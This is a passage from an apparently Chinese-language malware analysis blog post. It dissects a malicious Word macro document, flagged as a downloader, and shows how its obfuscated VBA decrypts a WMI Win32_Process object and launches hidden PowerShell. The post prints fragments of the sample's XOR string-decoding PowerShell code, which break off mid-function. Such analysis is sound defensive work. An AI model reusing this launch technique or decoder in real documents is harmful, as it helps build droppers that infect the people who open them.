第一次分析Office类宏VBA病毒，做个记录。
# 样本概况
## 测试环境及工具
> 运行平台：Windows 7 x64 进程监控工具：ProcessHacker 调试分析工具：powershell_ise、Visual
> Studio2019
## 样本基本信息
> 文件名称: a474c4ea67fd30e80ca375370d19dd0712997889814c2960d8a41c2856092ce5.doc  
>  样本类型: Microsoft Word 2007+  
>  样本大小: 28.44KB (29123 bytes)  
>  MD5: 9eafc9090d71b382af7c8c04e83d61d2  
>  SHA1: 32a192bab959b725cc02cf3df9b063e160b9ac43  
>  SHA256: a474c4ea67fd30e80ca375370d19dd0712997889814c2960d8a41c2856092ce5
在virustotal上查询该样本，被标记为Downloader，而且还有一些厂商还未捕获该样本。
## 沙箱检测：
沙箱检测出病毒创建了3个进程，其中有一个是powershell.exe、释放了4个文件。
下面分析一下这个样本。
# 样本分析
## VBA宏分析
word 2010双击点开样本，提示需要启用宏功能，这是典型的Office类宏病毒手法，使用VBA宏脚本来隐藏实际功能，如下：
这里按下 **alt+f11** 打开宏调试器。
但是代码被混淆了，我们将所有内容复制出来，在网址
将其复原（虽然效果一般，依然有些排版混乱）如下：
## 动态调试
### 分析VBA代码
由于排版混乱，各种goto语句乱跳，静态分析让人头疼，我们将代码复制到宏调试器，直接动态调试。
f8单步我们可以发现函数`Docuement_Open`为入口函数，这里在入口设置断点（直接点击侧边的位置即可）。
`Dim Garniture As Object` 是声明Garniture变量为Object 数据类型。Object 数据类型Garniture变量存储为
32 位（4个字节）的地址形式，其为对象的引用。利用 Set 语句，声明为 Object的变量可以赋值为任何对象的引用。
使用 `GetObject` 函数返回文件中的 ActiveX 对象的引用，而且可以将该对象赋给对象变量。可以使用 Set 语句将 `GetObject`
返回的对象赋给对象变量。如：
    Dim test As Object
    Set test = GetObject("C:\test.exe")
#### Lethbridge函数
接着继续f8进入到`Lethbridge`函数，这里传入的参数为`de9a2c49a42b6`
> 视图--->本地窗口可以打开变量窗口，可以直接观察到每个变量的值。
`StrConv`是对字符串进行操作，第2个参数很关键，而且必填，其值的和决定转换的类型。
128表示的操作是Garniture变量存的字符串从 Unicode 转换为系统的默认代码页；
64表示将字符串转换为Unicode使用系统的默认代码页。
这里的参数是128，表示将Garniture变量存的字符串从 Unicode
转换为系统的默认代码页（我的理解是类似C++的String转char），然后存放在`Humoursome`数组。便于后续的解密操作。
调试过后可以知道，`Lethbridge`函数的作用是将`Humoursome`数组内容取出来一个一个进行解密，解密过后的结果为：
Lethbridge : "winmgmts:\\.\root\cimv2:Win32_Process" : String
> Win32_Process 类别代表在 Win32 系统上的一系列事件。
>
> "winmgmts:\\.\root\CIMV2"用法的说明是创建对象，获取进程相关信息。
>
> 总之通过"winmgmts:\\.\root\cimv2:Win32_Process"这个对象来创建进程，获取进程信息。
继续往下，获取`Win32_Process`字符串之后调用`GetObject`函数获取指定的对象并将获取的对象传入到调用函数`SnottineSS`内，该函数也会解密出一个字符串内容并通过  
`Win32_Process.Create`函数会创建一个进程，如下
紧接着下面又解密了一个字符串：
可以看出这是一个3692Byte的powershell脚本。内容如下：
    powershell -WindowStyle Hidden 
    function y171e {
    param($z4627)$k58be9='a57157c';
    $yce74a='';
    for ($i=0; $i -lt $z4627.length;$i+=2)
    {
        $vc2775=[convert]::ToByte($z4627.Substring($i,2),16);
        $yce74a+=[char]($vc2775 -bxor $k58be9[($i/2)%$k58be9.length]);
    }
    return
很显然这上面的内容肯定没有3692Byte，说明该powershell脚本并不完整。或者说，参数被隐藏了。
由`powershell -WindowStyle Hidden`可以知道，该脚本程序会在启动时将`PowerShell`窗口隐藏然后才执行之后的操作。
**我们需要得到完整的Power Shell脚本。**
启动Process
Hacker.exe监控进程，重新调试，在上面创建进程这个地方，powershell.exe一闪而过。可以确定此处打开了powershell.exe。
我们在此处下断点，再一次重新调试，运行到此处不f8，而是shift+f8，在Process
Hacker.exe中抓住powershell.exe一闪而逝的机会点击，powershell.exe打开属性，在General-->Command
line中可以看到完整的powershell脚本，如下：
将其复制出来，整理一下，得到完整的powershell脚本：
    powershell -WindowStyle Hidden 
    function y171e 
    {
        param($z4627)$k58be9='a57157c';
        $yce74a='';
        for ($i=0; $i -lt $z4627.length;$i+=2)
            {
                $vc2775=[convert]::ToByte($z4627.Substring($i,2),16);
                $yce74a+=[char]($vc2775 -bxor $k58be9[($i/2)%$k58be9.length]);